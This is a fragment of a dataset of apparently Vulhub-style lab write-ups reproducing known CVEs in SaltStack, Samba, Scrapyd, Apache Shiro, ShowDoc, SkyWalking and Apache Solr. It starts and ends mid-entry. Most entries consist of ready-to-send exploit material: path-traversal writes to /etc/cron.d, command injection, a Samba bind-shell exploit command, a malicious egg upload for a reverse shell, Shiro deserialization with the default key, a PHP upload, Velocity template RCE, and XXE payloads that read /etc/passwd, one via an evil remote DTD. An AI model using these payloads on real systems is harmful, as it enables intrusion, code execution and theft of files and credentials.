The wheel module contains commands used to read and write files under specific directory paths. The inputs to these functions are concatenated with the target directory and the resulting path is not canonicalized, leading to an escape of the intended path restriction.

The write method in wheel/file_roots.py uses os.path.isabs to check if the user input is an absolute path, possibly to prevent writing to other directories. However, attackers can actually use ../ to traverse to the root directory and write arbitrary files:


msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'file_roots.write',
    'path': '../../path/to/target',
    'data': 'test'
'saltenv': 'base',
  }


Referring to [this project][1], we can write a simple POC to write to /etc/cron.d/shell and use crontab to execute arbitrary commands:



id /tmp/success was successfully executed.

You can also use this [POC][2] to reproduce the vulnerability.

[1]: https://github.com/rossengeorgiev/salt-security-backports
[2]: https://github.com/jasperla/CVE-2020-11651-poc
-------------------------------------------------------------------------------","https://labs.f-secure.com/advisories/saltstack-authorization-bypass
https://github.com/rossengeorgiev/salt-security-backports
https://github.com/jasperla/CVE-2020-11651-poc"
saltstack,CVE-2020-16846,SaltStack Command Injection Remote Code Execution (CVE-2020-16846),"SaltStack Command Injection Remote Code Execution (CVE-2020-16846)

中文版本(Chinese version)

Salt is a new approach to infrastructure management built on a dynamic communication bus. Salt can be used for data-driven orchestration, remote execution for any infrastructure, configuration management for any app stack, and much more.

In November 2020, SaltStack officially disclosed two vulnerabilities, CVE-2020-16846 and CVE-2020-25592. CVE-2020-25592 allows arbitrary user to use the SSH module, and CVE-2020-16846 allows users to execute arbitrary commands. Chain these two vulnerabilities will allow unauthorized attackers to execute arbitrary commands through the Salt API.

References:
https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag
https://docs.saltstack.com/en/latest/ref/netapi/all/salt.netapi.rest_cherrypy.html

Vulnerable Environment

Execute the following command to start a SaltStack-Master service:


docker compose up -d


After the SaltStack-Master is started, the following ports will be listened:
4505/4506: SaltStack-Master server, which is a bridge between master and minions
8000: Salt's API server, SSL requiring
2222: SSH server inside the container

Exploit

Send the following request to https://your-ip:8000/run:


POST /run HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/x-yaml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|touch%20/tmp/success%3b


Inject the command touch /tmp/success through the ssh_priv parameter:
-------------------------------------------------------------------------------","https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag
https://docs.saltstack.com/en/latest/ref/netapi/all/salt.netapi.rest_cherrypy.html"
saltstack,CVE-2020-11651,SaltStack Information Disclosure Leads to Privilege Escalation (CVE-2020-11651),"SaltStack Information Disclosure Leads to Privilege Escalation (CVE-2020-11651)

中文版本(Chinese version)

SaltStack is a Python-based client-server configuration management tool. A security team disclosed that SaltStack has an authentication bypass vulnerability (CVE-2020-11651) and a directory traversal vulnerability (CVE-2020-11652).

In the CVE-2020-11651, attackers can bypass the Salt Master's validation logic by constructing malicious requests, call unauthorized function features, and consequently achieve remote command execution.

References:
https://labs.f-secure.com/advisories/saltstack-authorization-bypass
https://github.com/rossengeorgiev/salt-security-backports
https://github.com/saltstack/salt/blob/a67d76b15615983d467ed81371b38b4a17e4f3b7/tests/integration/master/testclearfuncs.py

Environment Setup

Execute the following command to start a SaltStack Master service 2019.2.3:


docker compose up -d


After the server starts, the following ports will be listening:
4505/4506: These are the ports for communication between SaltStack Master and minions
8000: This is the Salt API port
2222: This is the SSH server port inside the container

Vulnerability Reproduction

This document demonstrates the reproduction of CVE-2020-11651 vulnerability.

We can use the following request to execute the ClearFuncs.prepauth_info() method in salt/master.py:


{'cmd': 'prepauth_info'}


Using this method, we can obtain the keys of all users on the target. With these keys, we can execute backend functions with super administrator privileges, such as dispatching tasks.

Using this POC, first obtain the Key, then execute touch /tmp/success on the master:
-------------------------------------------------------------------------------","https://labs.f-secure.com/advisories/saltstack-authorization-bypass
https://github.com/rossengeorgiev/salt-security-backports
https://github.com/saltstack/salt/blob/a67d76b15615983d467ed81371b38b4a17e4f3b7/tests/integration/master/test_clear_funcs.py"
samba,CVE-2017-7494,"Samba Authenticated RCE (CVE-2017-7494, Aka SambaCry)","Samba Authenticated RCE (CVE-2017-7494, Aka SambaCry)

中文版本(Chinese version)

Samba is the standard Windows interoperability suite of programs for Linux and Unix, it provides secure, stable and fast file and print services for all clients using the SMB/CIFS protocol.

Samba 3.x after 3.5.0 and 4.x before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4 that is vulnerable to a remote code execution vulnerability named SambaCry. CVE-2017–7494 allows remote authenticated users to upload a shared library to a writable shared folder, and perform code execution attacks to take control of servers that host vulnerable Samba services.

Environment Setup

Execute following commands to start a Samba server 4.6.3:


docker compose up -d


Principle

Reference to SambaCry RCE Exploit:

Microsoft Remote Procedure Call (RPC) is a powerful technology for creating distributed client/server programs. RPC is an interprocess communication technique that allows client and server software to communicate.

MSRPC protocol allows to connect to a named pipe from remote destination. When trying to open a pipe using MSRPC on Samba, the server verifies the validity of the pipe name using the internal function isknownpipename().

An external RPC server can be set using the 'rpc_server' variable inside smb.conf and then it will handle the pipe request.

The function isknownpipename() doesn’t check that the pipe is valid, this allows to use '/' to insert a full path of an arbitrary library.

The exploitation requirements:
An anonymous writeable server or an authenticated Samba account
A known path of the writeable sharing directory

See also:
https://medium.com/@lucideus/sambacry-rce-exploit-lucideus-research-3a3e5bd9e17c
https://github.com/opsxcq/exploit-CVE-2017-7494
http://bobao.360.cn/learning/detail/3900.html

Exploit

Samba config ( you can find here ) of our target server:


[global]
    map to guest = Bad User
    server string = Samba Server Version %v
    guest account = nobody

[myshare]
    path = /home/share
    read only = no
    guest ok = yes
    guest only = yes


Use smbclient to test connecting:


smbclient //your-ip/myshare -N




If you got connection error, please check your network, especially port 445.

Using <https://github.com/opsxcq/exploit-CVE-2017-7494to exploit the server:


./exploit.py -t your-ip -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699


Successful execute commands:



Please note that, metasploit's exploit/linux/samba/isknownpipename is tested failed since XX(I don't know) version, and I am really sure that it works on Jun 2017.
-------------------------------------------------------------------------------","https://medium.com/@lucideus/sambacry-rce-exploit-lucideus-research-3a3e5bd9e17c
https://github.com/opsxcq/exploit-CVE-2017-7494
http://bobao.360.cn/learning/detail/3900.html
https://github.com/opsxcq/exploit-CVE-2017-7494"
scrapy,Unknown,Scrapyd Pre-Auth Remote Code Execution,"Scrapyd Pre-Auth Remote Code Execution

中文版本(Chinese version)

Scrapyd is an application for deploying and running Scrapy spiders. It enables users to deploy (upload) projects and control their spiders using a JSON API.

References: <https://www.leavesongs.com/PENETRATION/attack-scrapy.html

Start server

Execution the following command to start a scrapyd server:

bash
docker compose up -d


After scrapyd is deployed, the server is listening on http://your-ip:6800.

Reproduce

Build a evil egg archive:

bash
pip install scrapy scrapyd-client
scrapy startproject evil
cd evil
edit evil/init.py, add evil code
scrapyd-deploy --build-egg=evil.egg


Upload evil egg to the scrapyd server:

bash
curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg


reverse shell is available:
-------------------------------------------------------------------------------","https://www.leavesongs.com/PENETRATION/attack-scrapy.html
http://your-ip:6800/addversion.json"
shiro,CVE-2016-4437,Apache Shiro 1.2.4 Deserialization Remote Code Execution (CVE-2016-4437),"Apache Shiro 1.2.4 Deserialization Remote Code Execution (CVE-2016-4437)

中文版本(Chinese version)

Apache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management.

In Apache Shiro 1.2.4 and earlier versions, encrypted user information is serialized and stored in a cookie named ""remember-me"". Attackers can forge user cookies using Shiro's default key, triggering a Java deserialization vulnerability that allows arbitrary command execution on the target machine.

Environment Setup

Execute the following command to start a Web application using Apache Shiro 1.2.4:


docker compose up -d


After the server starts, visit http://your-ip:8080 and you can log in using the credentials admin:vulhub.

Vulnerability Reproduction

Use ysoserial to generate a CommonsBeanutils1 Gadget:


java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 ""touch /tmp/success"" poc.ser


Encrypt the payload using Shiro's built-in default key:

java
package org.vulhub.shirodemo;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.io.DefaultSerializer;

import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Paths;

public class TestRemember {
    public static void main(String[] args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(""/path"", ""to"", ""poc.ser""));

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes(""kPH+bIxk5D2deZiIxcaaaA==""));

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}


Then send the following request with the payload in the rememberMe cookie:


GET / HTTP/1.1
Host: your-ip:8080
Cookie: rememberMe=<encrypted_payload




You will see the touch /tmp/success command has been executed:
-------------------------------------------------------------------------------",
shiro,CVE-2020-1957,Apache Shiro Authentication Bypass Vulnerability (CVE-2020-1957),"Apache Shiro Authentication Bypass Vulnerability (CVE-2020-1957)

中文版本(Chinese version)

Apache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management.

In versions of Apache Shiro prior to 1.5.2 with the Spring dynamic controller, an attacker can construct a maliciously crafted request using ..; to bypass the directory authentication.

Reference links:
<https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aL139
<https://xz.aliyun.com/t/8281
<https://blog.spoock.com/2020/05/09/cve-2020-1957/

Vulnerability environment

Start an application with Spring 2.2.2 and Shiro 1.5.1 by executing the following command.


docker compose up -d


Once the environment is started, visit http://your-ip:8080 to see the home page.

The configuration of URL permissions in this application is as follows.

 java
@Bean
public ShiroFilterChainDefinition shiroFilterChainDefinition() {
    DefaultShiroFilterChainDefinition chainDefinition = new DefaultShiroFilterChainDefinition();
    chainDefinition.addPathDefinition(""/login.html"", ""authc""); // need to accept POSTs from the login form
    chainDefinition.addPathDefinition(""/logout"", ""logout"");
    chainDefinition.addPathDefinition(""/admin/"", ""authc"");
    return chainDefinition;
}


Exploit

A direct request to the admin page /admin/ is inaccessible and will be redirected to the login page.



Construct a malicious request /xxx/..;/admin/ to bypass authentication checks and access the admin page.
-------------------------------------------------------------------------------","https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aL139
https://xz.aliyun.com/t/8281
https://blog.spoock.com/2020/05/09/cve-2020-1957/"
shiro,CVE-2010-3863,Apache Shiro Authentication Bypass Vulnerability (CVE-2010-3863),"Apache Shiro Authentication Bypass Vulnerability (CVE-2010-3863)

中文版本(Chinese version)

Apache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management.

Apache Shiro before 1.1.0, and JSecurity 0.9.x, does not canonicalize URI paths before comparing them to entries in the shiro.ini file, which allows remote attackers to bypass intended access restrictions via a crafted request, as demonstrated by the /./, /../, /, // URI.

References:
<https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34
<https://xz.aliyun.com/t/11633#toc-2
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863

Vulnerable Environment

Start an application with Spring and Shiro 1.0.0 by executing the following command.


docker compose up -d


Once the environment is started, visit http://your-ip:8080 to see the home page.

Vulnerability Reproduce

A direct request to the admin page /admin is inaccessible and will be redirected to the login page.



Construct a malicious request /./admin to bypass authentication checks and access the admin page.
-------------------------------------------------------------------------------","https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34
https://xz.aliyun.com/t/11633#toc-2
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863"
showdoc,Unknown,ShowDoc 3.2.5 SQL Injection,"ShowDoc 3.2.5 SQL Injection

中文版本(Chinese version)

ShowDoc is a tool greatly applicable for an IT team to share documents online. It can promote communication efficiency between members of a team.

ShowDoc version <= 3.2.5, an unauthenticated SQL injection issue is found and attacker is able to steal user password and token from SQLite database.

References:
<https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda

Vulnerable environment

Execute following command to start a ShowDoc server 3.2.4:


docker compose up -d


After the server is started, browse http://your-ip:8080 to see the index page of ShowDoc. Log in the portal using username showdoc and password 123456.

Exploit

Once a user has logged into ShowDoc, a user token is generated in the SQLite database. Compared to stealing a user's hashed password through SQL injection，user token is a more useful target.

Before exploiting the issue, a CAPTCHA recognition library is required:


pip install onnxruntime ddddocr requests


Then use this POC to extract the token:


python3 poc.py -u http://localhost:8080




To test if the token is valid:
-------------------------------------------------------------------------------","https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda
http://localhost:8080"
showdoc,Unknown,ShowDoc Unauthenticated File Upload and Remote Code Execution (CNVD-2020-26585),"ShowDoc Unauthenticated File Upload and Remote Code Execution (CNVD-2020-26585)

中文版本(Chinese version)

ShowDoc is a tool greatly applicable for an IT team to share documents online. It can promote communication efficiency between members of a team.

ShowDoc version before 2.8.7, an unrestricted and unauthenticated file upload issue is found and attacker is able to upload a webshell and execute arbitrary code on server.

References:
<https://github.com/star7th/showdoc/pull/1059
<https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a
<https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f

Vulnerable environment

Execute following command to start a ShowDoc server 2.8.2:


docker compose up -d


After the server is started, browse http://your-ip:8080 to see the index page of ShowDoc.

Exploit

Simply send following request to upload a PHP file:


POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl
Content-Length: 213
-----WebKitFormBoundary0RdOKBR8AmAxfRyl
Content-Disposition: form-data; name=""editormd-image-file""; filename=""test.<php""
Content-Type: text/plain

<?=phpinfo();?
-----WebKitFormBoundary0RdOKBR8AmAxfRyl--



PHP file address will be respond:



phpinfo() is executed successfully:
-------------------------------------------------------------------------------","https://github.com/star7th/showdoc/pull/1059
https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a
https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f"
skywalking,Unknown,Apache Skywalking 8.3.0 SQL Injection Vulnerability,"Apache Skywalking 8.3.0 SQL Injection Vulnerability

中文版本(Chinese version)

Application performance monitor tool for distributed systems, especially designed for microservices, cloud native and container-based (Docker, Kubernetes, Mesos) architectures.

In GraphQL interfaces of Apache Skywalking 8.3.0 and previous, there is a H2 Database SQL injection vulnerability.

Reference link:
https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw
https://github.com/apache/skywalking/commit/0bd81495965d801315dd7417bb17333ae0eccf3b#diff-ec87a1cdf66cdb37574d9eafd4d72d99ed94a38c4a8ff2aa9c7b8daeff502a2c

Vulnerability environment

Execute the following command to start an Apache Skywalking 8.3.0:


docker compose up -d


After the environment is started, visit http://your-ip:8080 to view the Skywalking page.

POC

I use GraphiQL's desktop app to send the following GraphQL query:



It can be seen that the SQL statement has raised error, and the value of the metricName parameter has been injected ​​after from.

The HTTP request of this GraphQL query is:


POST /graphql HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 336

{
    ""query"":""query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}
"",
    ""variables"":{
        ""condition"":{
            ""metricName"":""sqli"",
            ""state"":""ALL"",
            ""paging"":{
                ""pageSize"":10
            }
        }
    }
}


For more in-depth exploit, you can research by yourself, and welcome to submit PR to us.
-------------------------------------------------------------------------------","https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw
https://github.com/apache/skywalking/commit/0bd81495965d801315dd7417bb17333ae0eccf3b#diff-ec87a1cdf66cdb37574d9eafd4d72d99ed94a38c4a8ff2aa9c7b8daeff502a2c"
solr,CVE-2019-17558,Apache Solr Remote Code Execution Via Velocity Template (CVE-2019-17558),"Apache Solr Remote Code Execution Via Velocity Template (CVE-2019-17558)

中文版本(Chinese version)

Solr is the popular, blazing-fast, open source enterprise search platform built on Apache Lucene(TM).

Apache Solr 5.0.0 to Apache Solr 8.3.1 are vulnerable to a Remote Code Execution through the VelocityResponseWriter. A Velocity template can be provided through Velocity templates in a configset velocity/ directory or as a parameter. A user defined configset could contain renderable, potentially malicious, templates. Parameter provided templates are disabled by default, but can be enabled by setting params.resource.loader.enabled by defining a response writer with that setting set to true. Defining a response writer requires configuration API access. Solr 8.4 removed the params resource loader entirely, and only enables the configset-provided template rendering when the configset is trusted (has been uploaded by an authenticated user).

References:
<https://nvd.nist.gov/vuln/detail/CVE-2019-17558
<https://issues.apache.org/jira/browse/SOLR-13971
<https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133
<https://github.com/jas502n/solr_rce

Environment Setup

Execute the following command to start an Apache Solr 8.2.0 server:


docker compose up -d


After the server starts, you can access the Apache Solr management interface at http://your-ip:8983/. No authentication is required.

Vulnerability Reproduction

First, get all core names through the following API:


http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json


The demo is the only core in this environment:



Enable the params.resource.loader.enabled configuration through the following API (the endpoint is /solr/[core name]/config):


POST /solr/demo/config HTTP/1.1
Host: solr:8983
Content-Type: application/json
Content-Length: 259

{
  ""update-queryresponsewriter"": {
    ""startup"": ""lazy"",
    ""name"": ""velocity"",
    ""class"": ""solr.VelocityResponseWriter"",
    ""template.base.dir"": """",
    ""solr.resource.loader.enabled"": ""true"",
    ""params.resource.loader.enabled"": ""true""
  }
}


Then, trigger the vulnerability by sending a malicious Velocity template:


http://your-ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
-------------------------------------------------------------------------------","https://nvd.nist.gov/vuln/detail/CVE-2019-17558
https://issues.apache.org/jira/browse/SOLR-13971
https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133
https://github.com/jas502n/solr_rce"
solr,CVE-2017-12629,Apache Solr XML External Entity Injection (CVE-2017-12629),"Apache Solr XML External Entity Injection (CVE-2017-12629)

中文版本(Chinese version)

Apache Solr is an open-source search server. It is written in Java and built upon Apache Lucene. Before version 7.1.0, two vulnerabilities were discovered: XML External Entity (XXE) and Remote Command Execution (RCE), both numbered as CVE-2017-12629. These two vulnerabilities can be chained together to form an attack chain.

This environment demonstrates the XXE vulnerability. For the RCE vulnerability and exploitation chain, please refer to CVE-2017-12629-RCE.

References:
<https://www.exploit-db.com/exploits/43009/
<https://paper.seebug.org/425/

Environment Setup

Execute the following command to start an Apache Solr 7.0.1 server:


docker compose up -d


After the server starts, you can access the Apache Solr management interface at http://your-ip:8983/. No authentication is required.

Vulnerability Reproduction

Since the response does not include the information we sent in the XML, this is a Blind XXE vulnerability. However, we can use Error Based XXE to read files.

To exploit Error Based XXE, we need to find suitable DTD files. Here are several approaches:

Using fonts.dtd from fontconfig-config

The openjdk Docker image has fontconfig-config installed, which contains a suitable DTD file: /usr/share/xml/fontconfig/fonts.dtd.

Construct the XXE payload:

xml
<?xml version=""1.0"" ?
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM ""file:///usr/share/xml/fontconfig/fonts.dtd""

    <!ENTITY % expr 'aaa)
        <!ENTITY &#x25; file SYSTEM ""file:///etc/passwd""
        <!ENTITY &#x25; eval ""<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;""
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'

    %local_dtd;
]
<messageany text</message


Send the request with the encoded payload:


GET /solr/demo/select?wt=xml&defType=xmlparser&q=%3C%3Fxml%20version%3D%221%2E0%22%20%3F%3E%0A%3C%21DOCTYPE%20message%20%5B%0A%20%20%20%20%3C%21ENTITY%20%25%20local%5Fdtd%20SYSTEM%20%22file%3A%2F%2F%2Fusr%2Fshare%2Fxml%2Ffontconfig%2Ffonts%2Edtd%22%3E%0A%0A%20%20%20%20%3C%21ENTITY%20%25%20expr%20%27aaa%29%3E%0A%20%20%20%20%20%20%20%20%3C%21ENTITY%20%26%23x25%3B%20file%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%0A%20%20%20%20%20%20%20%20%3C%21ENTITY%20%26%23x25%3B%20eval%20%22%3C%21ENTITY%20%26%23x26%3B%23x25%3B%20error%20SYSTEM%20%26%23x27%3Bfile%3A%2F%2F%2Fnonexistent%2F%26%23x25%3Bfile%3B%26%23x27%3B%3E%22%3E%0A%20%20%20%20%20%20%20%20%26%23x25%3Beval%3B%0A%20%20%20%20%20%20%20%20%26%23x25%3Berror%3B%0A%20%20%20%20%20%20%20%20%3C%21ELEMENT%20aa%20%28bb%27%3E%0A%0A%20%20%20%20%25local%5Fdtd%3B%0A%5D%3E%0A%3Cmessage%3Eany%20text%3C%2Fmessage%3E HTTP/1.1
Host: localhost.lan:8983
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0






Using DTD from JAR Files

Since we can't predict what software is installed on the target server in a black-box scenario, using DTD files from internal JAR files is a better approach. For example, we can use LuceneCoreQuery.dtd from the lucene-queryparser.jar that Solr depends on.

Construct the XXE payload:

xml
<?xml version=""1.0"" ?
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM ""jar:file:///opt/solr/server/solr-webapp/webapp/WEB-INF/lib/lucene-queryparser-7.0.1.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd""

    <!ENTITY % queries 'aaa)
        <!ENTITY &#x25; file SYSTEM ""file:///etc/passwd""
        <!ENTITY &#x25; eval ""<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;""
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'

    %local_dtd;
]
<messageany text</message


Send the request with the encoded payload:


GET /solr/demo/select?wt=xml&defType=xmlparser&q=%3C%3Fxml%20version%3D%221%2E0%22%20%3F%3E%0A%3C%21DOCTYPE%20message%20%5B%0A%20%20%20%20%3C%21ENTITY%20%25%20local%5Fdtd%20SYSTEM%20%22jar%3Afile%3A%2F%2F%2Fopt%2Fsolr%2Fserver%2Fsolr%2Dwebapp%2Fwebapp%2FWEB%2DINF%2Flib%2Flucene%2Dqueryparser%2D7%2E0%2E1%2Ejar%21%2Forg%2Fapache%2Flucene%2Fqueryparser%2Fxml%2FLuceneCoreQuery%2Edtd%22%3E%0A%0A%20%20%20%20%3C%21ENTITY%20%25%20queries%20%27aaa%29%3E%0A%20%20%20%20%20%20%20%20%3C%21ENTITY%20%26%23x25%3B%20file%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%0A%20%20%20%20%20%20%20%20%3C%21ENTITY%20%26%23x25%3B%20eval%20%22%3C%21ENTITY%20%26%23x26%3B%23x25%3B%20error%20SYSTEM%20%26%23x27%3Bfile%3A%2F%2F%2Fnonexistent%2F%26%23x25%3Bfile%3B%26%23x27%3B%3E%22%3E%0A%20%20%20%20%20%20%20%20%26%23x25%3Beval%3B%0A%20%20%20%20%20%20%20%20%26%23x25%3Berror%3B%0A%20%20%20%20%20%20%20%20%3C%21ELEMENT%20aa%20%28bb%27%3E%0A%0A%20%20%20%20%25local%5Fdtd%3B%0A%5D%3E%0A%3Cmessage%3Eany%20text%3C%2Fmessage%3E HTTP/1.1
Host: localhost.lan:8983
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0




Successfully read the /etc/passwd file:



Using Remote DTD Files

If we cannot find suitable local DTD files on the target server and the server can connect to the internet, we can use remote DTD files.

Deploy a DTD file on an HTTP server:

xml
<!ENTITY % test ""example""
<!ELEMENT pattern (%test;)


Then construct the XXE payload:

xml
<?xml version=""1.0"" ?
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM ""http://evil.host.name/include.dtd""

    <!ENTITY % test 'aaa)
        <!ENTITY &#x25; file SYSTEM ""file:///etc/passwd""
        <!ENTITY &#x25; eval ""<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;""
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'

    %local_dtd;
]
<messageany text</message


Send the request with the encoded payload:


GET /solr/demo/select?wt=xml&defType=xmlparser&q=%3C%3Fxml%20version%3D%221%2E0%22%20%3F%3E%0A%3C%21DOCTYPE%20message%20%5B%0A%20%20%20%20%3C%21ENTITY%20%25%20local%5Fdtd%20SYSTEM%20%22https%3A%2F%2Fgist%2Egithubusercontent%2Ecom%2Fphith0n%2F188f03ac0f3c5d899895268f05fd0a51%2Fraw%2F7b481b122622d77c49c619fa047a52051f9652d8%2Finclude%2Edtd%22%3E%0A%0A%20%20%20%20%3C%21ENTITY%20%25%20test%20%27aaa%29%3E%0A%20%20%20%20%20%20%20%20%3C%21ENTITY%20%26%23x25%3B%20file%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%0A%20%20%20%20%20%20%20%20%3C%21ENTITY%20%26%23x25%3B%20eval%20%22%3C%21ENTITY%20%26%23x26%3B%23x25%3B%20error%20SYSTEM%20%26%23x27%3Bfile%3A%2F%2F%2Fnonexistent%2F%26%23x25%3Bfile%3B%26%23x27%3B%3E%22%3E%0A%20%20%20%20%20%20%20%20%26%23x25%3Beval%3B%0A%20%20%20%20%20%20%20%20%26%23x25%3Berror%3B%0A%20%20%20%20%20%20%20%20%3C%21ELEMENT%20aa%20%28bb%27%3E%0A%0A%20%20%20%20%25local%5Fdtd%3B%0A%5D%3E%0A%3Cmessage%3Eany%20text%3C%2Fmessage%3E HTTP/1.1
Host: localhost.lan:8983
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0




Successfully read the /etc/passwd file:
-------------------------------------------------------------------------------","https://www.exploit-db.com/exploits/43009/
https://paper.seebug.org/425/"
solr,CVE-2019-0193,Apache Solr Remote Command Execution (CVE-2019-0193),"Apache Solr Remote Command Execution (CVE-2019-0193)

中文版本(Chinese version)

Apache Solr is an open-source search server. It is written in Java and built upon Apache Lucene. This vulnerability exists in Apache Solr's DataImportHandler, which is an optional but commonly used module for extracting data from databases and other sources. The vulnerability arises because all DIH configurations can be set through the dataConfig parameter in external requests. Since DIH configurations can contain scripts, attackers can execute remote commands by constructing malicious requests.

References:
<https://mp.weixin.qq.com/s/typLOXZCev9WHUx0s6oA
<https://paper.seebug.org/1009/

Environment Setup

Execute the following command to start an Apache Solr 8.1.1 server:


docker compose up -d


After the server starts, you can access the Apache Solr management interface at http://your-ip:8983/. No authentication is required.

Vulnerability Reproduction

First, select the demo core from the left sidebar, open the Dataimport panel, enable Debug mode on the right, and enter the following POC:


<dataConfig
  <script<![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec(""touch /tmp/success"");
          }
  ]]</script
  <document
    <entity name=""sample""
            fileName="".*""
            baseDir=""/""
            processor=""FileListEntityProcessor""
            recursive=""false""
            transformer=""script:poc"" /
  </document
</dataConfig




Click ""Execute with this Configuration"" to send the following request:


POST /solr/demo/dataimport?_=1708782956647&indent=on&wt=json HTTP/1.1
Host: your-ip:8983
Content-Length: 613
Accept: application/json, text/plain, /
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-type: application/x-www-form-urlencoded
Origin: http://your-ip:8983
Referer: http://your-ip:8983/solr/
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Connection: close

